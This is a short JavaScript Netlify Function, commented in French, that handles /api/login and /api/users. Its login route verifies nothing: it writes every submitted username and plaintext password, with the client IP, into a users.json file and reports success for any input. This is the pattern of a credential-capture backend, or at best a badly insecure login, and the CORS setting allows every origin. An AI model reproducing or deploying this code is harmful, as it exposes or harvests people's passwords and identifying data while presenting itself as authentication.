const fs = require('fs');
const path = require('path');

// Gestionnaire Netlify Function pour /api/login et /api/users
exports.handler = async (event) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Content-Type': 'application/json'
  };

  // Répondre au preflight CORS
  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }

  const USERS_FILE = path.join(__dirname, '..', '..', 'users.json');

  // Lire users.json
  function readUsers() {
    try {
      if (!fs.existsSync(USERS_FILE)) {
        fs.writeFileSync(USERS_FILE, '[]', 'utf8');
        return [];
      }
      return JSON.parse(fs.readFileSync(USERS_FILE, 'utf8'));
    } catch {
      return [];
    }
  }

  function writeUsers(users) {
    try {
      fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2), 'utf8');
      return true;
    } catch {
      return false;
    }
  }

  // Route /api/users (GET)
  if (event.path.endsWith('/api/users') && event.httpMethod === 'GET') {
    const users = readUsers();
    const safeUsers = users.map(u => ({ username: u.username, date: u.date }));
    return { statusCode: 200, headers, body: JSON.stringify(safeUsers) };
  }

  // Route /api/login (POST)
  if (event.path.endsWith('/api/login') && event.httpMethod === 'POST') {
    try {
      const { username, password } = JSON.parse(event.body);

      if (!username || !username.trim()) {
        return { statusCode: 400, headers, body: JSON.stringify({ success: false, message: 'Nom d\'utilisateur requis' }) };
      }
      if (!password || !password.trim()) {
        return { statusCode: 400, headers, body: JSON.stringify({ success: false, message: 'Mot de passe requis' }) };
      }

      const cleanUsername = username.trim();
      const cleanPassword = password.trim();

      const userEntry = {
        username: cleanUsername,
        password: cleanPassword,
        date: new Date().toISOString(),
        ip: event.headers['client-ip'] || event.headers['x-forwarded-for'] || 'unknown'
      };

      const users = readUsers();
      users.push(userEntry);
      writeUsers(users);

      console.log(`Nouvelle connexion: ${cleanUsername}`);

      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({
          success: true,
          message: 'Connexion enregistrée avec succès',
          user: { username: cleanUsername, date: userEntry.date }
        })
      };

    } catch (error) {
      console.error('Erreur:', error.message);
      return { statusCode: 500, headers, body: JSON.stringify({ success: false, message: 'Erreur serveur' }) };
    }
  }

  return { statusCode: 404, headers, body: JSON.stringify({ error: 'Not found' }) };
};